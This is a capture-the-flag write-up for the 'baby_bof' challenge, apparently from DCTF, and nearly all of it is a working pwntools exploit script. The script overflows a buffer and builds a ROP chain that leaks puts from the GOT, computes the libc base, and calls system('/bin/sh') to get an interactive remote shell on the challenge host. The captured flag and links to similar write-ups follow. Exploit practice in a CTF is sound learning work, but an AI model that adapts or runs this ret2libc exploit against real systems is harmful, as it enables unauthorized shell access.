## ***BABY_BOF***

```py
from pwn import *

binary = context.binary = ELF('./baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
libc = ELF('./libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')

puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')
p.interactive()
```
Flag : ***```dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}```***

similiar : https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop 
           
   https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what
